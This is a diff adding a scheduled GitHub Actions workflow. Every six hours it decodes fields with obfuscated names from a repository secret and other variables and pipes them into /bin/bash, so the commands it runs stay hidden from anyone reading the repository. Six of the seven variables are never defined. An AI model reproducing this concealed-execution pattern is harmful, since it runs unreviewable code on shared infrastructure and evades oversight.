@@ -1,0 +1,22 @@
+name: dayeweiguo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dayeweiguo
+        env:
+          alnu513: ${{ secrets.alnu513 }}
+        run: |
+          echo $alnu513 | jq -r .oo9819 | /bin/bash
+          echo $cn1272 | jq -r .swif44 | /bin/bash
+          echo $jpcfv98 | jq -r .cf33556 | /bin/bash
+          echo $h9520 | jq -r .x5885 | /bin/bash
+          echo $mvtx8908 | jq -r .n852 | /bin/bash
+          echo $qiwsl7500 | jq -r .rtiw29044 | /bin/bash
+          echo $fo4 | jq -r .ms65839 | /bin/bash
+
